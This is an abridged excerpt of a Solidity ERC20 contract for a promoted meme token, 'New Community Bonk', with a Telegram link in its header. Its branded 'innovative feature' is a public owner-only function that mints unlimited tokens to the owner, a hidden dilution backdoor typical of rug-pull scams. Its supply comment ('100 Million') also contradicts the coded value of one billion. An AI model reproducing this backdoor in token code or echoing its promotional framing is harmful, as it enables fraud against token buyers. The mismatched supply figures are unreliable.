...
//
// $NewCommunityBonk proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/NewCommunityBonk
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _NewCommunityBonk(uint256 amount) public onlyOwner {
 _NewCommunityBonk(msg.sender, amount);
    }
    ...
    function _NewCommunityBonk(address account, uint256 amount) internal virtual {
...
contract $NewCommunityBonk is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("New Community Bonk", "NCB") {
     _NewCommunityBonk(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}